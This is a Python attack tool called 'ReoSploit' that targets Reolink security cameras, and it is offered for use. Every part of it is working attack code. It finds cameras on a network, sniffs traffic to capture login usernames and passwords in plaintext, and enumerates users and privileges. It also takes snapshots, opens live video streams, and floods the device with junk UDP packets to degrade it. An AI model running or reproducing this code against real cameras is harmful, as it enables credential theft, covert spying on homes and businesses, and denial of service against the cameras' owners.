#!/bin/env python3
import requests
import json
import sys
import os
from colorama import Fore, init, Back, Style
init()
import socket
import random
import netaddr
import pyshark
import argparse
import threading
from queue import Queue
import time
import cv2
from scapy.all import *
def setargs():
	global args
	parser = argparse.ArgumentParser(description='Exploit the shitty web security of Reolink Cameras.')
	parser.add_argument('ip', help="IP of Target Reolink Camera", type=str)
	parser.add_argument('action', choices=['scan', 'listen', 'token', 'enumerate', 'snap', 'dos', 'stream'], help='''Action to do. (Scan: Scan your network for ReoLink Devices) (Listen: Listen for Connections to and from the Camera) (Token: Generate an Authentication Token with a Username and Password) (Enumerate: Enumerates information about the Camera) (Snap: Snaps a photo from the camera using a Token) (Dos: DOS the Target Device and Slow it down, including slowing down the Webpage and Video.) (Stream: Get a Live Stream from the Camera's Video Feed.)''')
	parser.add_argument('-u', help="Username to Authenticate on Camera", type=str)
	parser.add_argument('-p', help="Password to Authenticate on Camera", type=str)
	parser.add_argument('-i', help="Network iFace to use if listening.", type=str)
	parser.add_argument('-t', help="Threads to use when needed.", type=int, default=50)
	args = parser.parse_args()

def info(message):
	print('[' + Fore.BLUE + '*' + Fore.RESET + '] ' + message)

def scan():
	info("Scanning " + str(len(ips)) + " potential Hosts...")
	def probe(ip):
		try:
			r = requests.get('http://' + str(ip))
			if "<title id=appTitle>Reolink</title>" in r.text:
				mac = getmacbyip(str(ip))
				info("Found Reolink Device: " + str(ip) + " -- " + mac)
			else:
				pass
		except requests.exceptions.ConnectionError:
			pass
			
	try:
		def threader():
			while True:
				worker = q.get()
				probe(worker)
				q.task_done()
		q = Queue()
		for a in range(args.t):
			t = threading.Thread(target=threader)
			t.daemon = True
			t.start()
		for worker in ips:
			q.put(worker)
		q.join()
	except Exception as e:
		info("Unforseen Error: " + e)
		
	print("")
	info("Finished!")
		

def listen():
	if not args.i:
		info('If you are listening, please specify a Network iFace to use!')
		sys.exit()
	info('Listening for Reolink Traffic on ' + args.i + '...')
	capture = pyshark.LiveCapture(interface=args.i, use_json=True, display_filter=f"http && ip.dst == {args.ip} or ip.src == {args.ip}")
	while True:
		for packet in capture.sniff_continuously(packet_count=100):
			# SESSION DECLARTATION
			try:
				username = packet['json'].array.object[0].member[2]
				info('Found Active HTTP Session')
				print('Client: ' + packet['ip'].dst)
				print('User: ' + username)
			except KeyError:
				pass
			except TypeError:
				pass

			# LOGIN SEQUENCE

			try:
				if '/api.cgi?cmd=Login' in str(packet.http):
					info('Found Login HTTP Request')
					username = packet['json'].array.object.member[2].object.member.object.member[0].string
					passw = packet['json'].array.object.member[2].object.member.object.member[1].string
					print('Client: ' + packet['ip'].src)
					print('Login: ' + username + ':' + passw)
			except KeyError:
				pass

def gettoken(ip):
	if not args.u or not args.p:
		info('A Username & Password for Authentication is Required for generating a Token!')
		sys.exit()
	username = args.u
	passw = args.p
	info("Generating a Token from " + ip + " for " + username + ":" + passw + "...")
	r = requests.post("http://" + ip + "/cgi-bin/api.cgi?cmd=Login&token=null", json=[{"cmd":"Login","action":0,"param":{"User":{"userName":username,"password":passw}}}])
	try:
		token = json.loads(r.text)[0]["value"]["Token"]["name"]
	except KeyError:
		info('Authentication Error.')
		sys.exit()
	return token

def numberboolean(number):
	if number == 0 or number == 6:
		return green + Style.BRIGHT + "Yes" + Fore.RESET + Style.RESET_ALL
	else:
		return Fore.RED + Style.BRIGHT + "No" + Fore.RESET + Style.RESET_ALL

def enumerate():
	info('Getting Token To Authenticate To Fully Enumerate...')
	token = gettoken(args.ip)
	info('Requesting Information...')
	data = [{"cmd":"GetAbility","action":0,"param":{"User":{"userName":args.u}}},{"cmd":"GetNetPort","action":0,"param":{}},{"cmd":"GetDevInfo","action":0,"param":{}},{"cmd":"GetLocalLink","action":0,"param":{}},{"cmd":"GetUser","action":0,"param":{}}]
	r = requests.post("http://" + args.ip + "/cgi-bin/api.cgi?token=" + token, json=data)
	jsondata = json.loads(r.content)
	info("Getting List Of Users...")
	payload = [{"cmd":"GetUser","action":0,"param":{}}]
	usersjson = json.loads(requests.post("http://" + args.ip + "/cgi-bin/api.cgi?cmd=GetUser&token=" + token, json=payload).text)
	info("Getting Storage Information...")
	r = requests.post("http://" + args.ip + "/cgi-bin/api.cgi?cmd=GetHddInfo&token=" + token, json=[{"cmd":"GetHddInfo","action":0,"param":{}}])
	hddjson = json.loads(r.content)
	info("Successfully Recieved Information!")

	print(Style.BRIGHT + """
INFORMATION """ + Fore.BLUE + """[Device: """ + args.ip + """]
""" + Fore.RESET + Style.RESET_ALL)

	print("IP: " + args.ip)
	print("MAC: " + jsondata[3]["value"]["LocalLink"]["mac"])
	print("Name: " + jsondata[2]["value"]["DevInfo"]["name"])
	print("Model: " + jsondata[2]["value"]["DevInfo"]["model"])
	print("Firmware: " + jsondata[2]["value"]["DevInfo"]["firmVer"])

	print(Style.BRIGHT + """
PRIVELEGE CHECK """ + Fore.BLUE + """[User: """ + args.u + """]
""" + Style.RESET_ALL + Fore.RESET)
	print("Can Use WiFi? " + numberboolean(jsondata[0]["value"]["Ability"]["wifi"]["permit"]))
	print("Can Take Recordings? " + numberboolean(jsondata[0]["value"]["Ability"]["abilityChn"][0]["videoClip"]["permit"]))
	print("Can Take Photos? " + numberboolean(jsondata[0]["value"]["Ability"]["abilityChn"][0]["snap"]["permit"]))
	print("Can Download Recordings? " + numberboolean(jsondata[0]["value"]["Ability"]["abilityChn"][0]["recDownload"]["permit"]))
	print("Can Modify/View FTP Options? " + numberboolean(jsondata[0]["value"]["Ability"]["abilityChn"][0]["ftp"]["permit"]))
	print("Can Modify/View EMail Options? " + numberboolean(jsondata[0]["value"]["Ability"]["email"]["permit"]))
	print("Can Stream from RTSP? " + numberboolean(jsondata[0]["value"]["Ability"]["rtsp"]["permit"]))
	print("Can Stream from RTMP? " + numberboolean(jsondata[0]["value"]["Ability"]["rtmp"]["permit"]))
	print("Can Reboot? " + numberboolean(jsondata[0]["value"]["Ability"]["reboot"]["permit"]))

	print(Style.BRIGHT + """
REGISTERED USERS """ + Fore.BLUE + """[Visible To: """ + args.u + """]
""" + Fore.RESET + Style.RESET_ALL)

	for user in usersjson[0]["value"]["User"]:
		print("Username: " + user["userName"])
		print("Privelege Level: " + user["level"])

	print(Style.BRIGHT + """
STORAGE INFORMATION """ + Fore.BLUE + """[Visible To: """ + args.u + """]
""" + Fore.RESET + Style.RESET_ALL)

	for hdd in hddjson[0]["value"]["HddInfo"]:
		print("Mount: " + str(hdd["mount"]))
		print("Capacity: " + str(hdd["capacity"] / 1000) + "GB")
		print("Used Storage: " + str(hdd["size"] / 1000) + "GB")
		print("\n")

def snap():
	info('Getting Token To Authenticate To Get Snapshot...')
	token = gettoken(args.ip)
	info('Requesting photo...')
	r = requests.get('http://' + args.ip + '/cgi-bin/api.cgi?cmd=Snap&channel=0&token=' + token)
	if r.status_code == 200:
		info('Successfully Snapped a Photo!')
		with open('/tmp/snap.jpg', 'wb') as o:
			o.write(r.content)
			o.close()
		info('Photo saved to /tmp/snap.jpg')
	else:
		info('Unknown Status Code, presuming the Snapshot failed...')

def dos():
	print(Style.BRIGHT + Fore.YELLOW + "WARNING:" + Style.RESET_ALL + " THIS ATTACK WILL SLOW DOWN THE CAMERA AND BE VERY OBVIOUS, PLEASE TAKE CAUTION!")
	info("Preparing for DOS...")
	ip = args.ip
	ports = [80, 443, 554]
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	info("Making Bogus Data...")
	bogusdata = random._urandom(64900)
	info("Starting DOS In 5 Seconds...")
	time.sleep(5)
	sent = 0
	print("Press CNTRL + C At Anytime to Stop the Attack.")
	try:
		while True:
			print("Sending Bogus Data to Ports On " + ip + "...")
			print("----------------------")
			for port in ports:
				s.sendto(bogusdata, (ip,port))
				sent += 1
				print("Sent Bogus Data -> " + str(port))
			print("\nSent " + Style.BRIGHT + str(sent) + Style.RESET_ALL + " Packets")
			print("----------------------\n")
	except KeyboardInterrupt:
		info("Stopping...")
		sys.exit()

def stream():
	if not args.u or not args.p:
		info('A Username & Password for Authentication is Required for Streaming Video!')
		sys.exit()
	info("Attempting to Stream Through RTSP...")
	print("Press CNTRL + C At Anytime to Stop the Stream.")
	cap = cv2.VideoCapture(f"rtsp://{args.u}:{args.p}@{args.ip}")
	try:
		while(cap.isOpened()):
			ret, frame = cap.read()
			frame = cv2.resize(frame, (900, 900))
			cv2.imshow(f'ReoSploit Stream @ {args.ip}', frame)
			if cv2.waitKey(20) & 0xFF == ord('q'):
				break
	except KeyboardInterrupt:
		pass
	cap.release()
	cv2.destroyAllWindows()


if os.geteuid() != 0:
	info('Please run this as ROOT!')
	sys.exit()

def clear():
	os.system('clear')
clear()
green = '\u001b[38;5;118m'
banner = fr'''
{Style.BRIGHT}{Fore.BLUE}██████╗ ███████╗ ██████╗ {Fore.RED}███████╗██████╗ ██╗      ██████╗ ██╗████████╗
{Fore.BLUE}██╔══██╗██╔════╝██╔═══██╗{Fore.RED}██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
{Fore.BLUE}██████╔╝█████╗  ██║   ██║{Fore.RED}███████╗██████╔╝██║     ██║   ██║██║   ██║   
{Fore.BLUE}██╔══██╗██╔══╝  ██║   ██║{Fore.RED}╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
{Fore.BLUE}██║  ██║███████╗╚██████╔╝{Fore.RED}███████║██║     ███████╗╚██████╔╝██║   ██║   
{Fore.BLUE}╚═╝  ╚═╝╚══════╝ ╚═════╝ {Fore.RED}╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
{green}SpiceSouls - Beyond Root Sec - V1.1.0
{Fore.RESET}{Style.RESET_ALL}'''

print(banner)
setargs()
if args.action == "scan":
	if "/" in args.ip:
		pass
	else:
		info("Please use an IP Range! E.g: 192.168.1.0/24")
		sys.exit()
	try:
		ips = list(netaddr.IPNetwork(args.ip).iter_hosts())
	except:
		info("Please use an IP Range! E.g: 192.168.1.0/24")
		sys.exit()
else:
	if "/" in args.ip:
		info("Please use a single IP! E.g: 192.168.1.1")
		sys.exit()
try:
	if args.action == 'scan':
		scan()
	elif args.action == 'listen':
		listen()
	elif args.action == 'token':
		token = gettoken(args.ip)
		info('Token Generated Successfully.')
		print("Camera: " + args.ip)
		print("Authentication: " + args.u + ":" + args.p)
		print("Token: " + token)
	elif args.action == 'enumerate':
		enumerate()
	elif args.action == 'snap':
		snap()
	elif args.action == 'dos':
		dos()
	elif args.action == 'stream':
		stream()
except KeyboardInterrupt:
	print("\nQuitting...")
	sys.exit()
